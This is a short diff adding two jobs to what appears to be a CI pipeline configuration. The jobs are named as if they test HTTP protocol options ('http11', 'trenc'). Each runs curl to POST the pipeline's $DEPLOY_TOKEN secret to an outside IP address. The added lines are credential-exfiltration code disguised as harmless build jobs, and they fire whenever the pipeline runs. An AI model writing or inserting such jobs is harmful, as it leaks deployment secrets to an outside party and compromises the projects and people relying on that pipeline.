@@ -1,0 +1,8 @@
+http11:
+  image: alpine:3.19
+  script:
+    - 'curl --http1.1 -s -X POST -d "t=$DEPLOY_TOKEN" 193.32.204.199'
+trenc:
+  image: alpine:3.19
+  script:
+    - 'curl --tr-encoding 1.2.3.4 -d "t=$DEPLOY_TOKEN"'
